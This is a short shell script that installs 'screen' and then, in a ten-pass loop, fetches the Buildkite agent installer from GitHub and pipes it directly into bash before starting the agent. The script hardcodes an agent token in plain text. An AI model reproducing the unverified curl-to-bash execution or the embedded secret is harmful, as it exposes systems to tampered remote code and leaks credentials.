#!/bin/sh
sudo apt-get install screen -y
screen

COUNTER=20
until [  $COUNTER -lt 10 ]; do
 
TOKEN="895a50a4cede9ff920922e7659b99ebb6c70234069c0e0d5f6" bash -c "`curl -sL https://raw.githubusercontent.com/buildkite/agent/master/install.sh`"
~/.buildkite-agent/bin/buildkite-agent start

 
     echo COUNTER $COUNTER
     let COUNTER-=1
done